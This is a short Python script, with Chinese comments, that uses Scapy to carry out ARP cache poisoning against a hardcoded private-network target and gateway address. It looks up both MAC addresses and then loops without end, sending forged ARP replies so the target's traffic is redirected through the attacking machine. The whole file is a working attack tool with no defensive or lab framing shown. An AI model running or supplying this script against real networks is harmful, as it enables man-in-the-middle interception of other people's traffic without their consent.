from scapy.all import IP, ARP, Ether, sendp, send, srp, RandMAC
import time
import sys


def arpPoisoning(target_ip, host_ip):
    def getMac(ip):  # 获取目标IP地址的MAC地址
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=False)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")
        return None

    def poisoningDone(target_ip, target_mac, host_ip, host_mac):  # 向目标和主机发送伪造的ARP回复,更新目标和主机的ARP缓存
        arp_target = ARP(op=2, pdst=target_ip, psrc=host_ip)
        arp_host = ARP(op=2, pdst=host_ip, psrc=target_ip)

        pkt_target = Ether(dst=target_mac) / arp_target
        pkt_host = Ether(dst=host_mac) / arp_host

        print(pkt_target.show())
        print(pkt_target)

        while True:
            sendp(pkt_target, verbose=False)
            # sendp(pkt_host, verbose=False)
            time.sleep(0.5)

    target_mac = getMac(target_ip)
    host_mac = getMac(host_ip)
    
    if target_mac is None:
        print(f"Failed to get MAC address for target IP {target_ip}")
        sys.exit(1)

    if host_mac is None:
        print(f"Failed to get MAC address for host IP {host_ip}")
        sys.exit(1)

    print(f"Starting ARP poisoning: {target_ip} ({target_mac}) <--> {host_ip} ({host_mac})")
    try:
        poisoningDone(target_ip, target_mac, host_ip, host_mac)
    except KeyboardInterrupt:
        sys.exit(0)


arpPoisoning("192.168.101.35", "192.168.100.1")
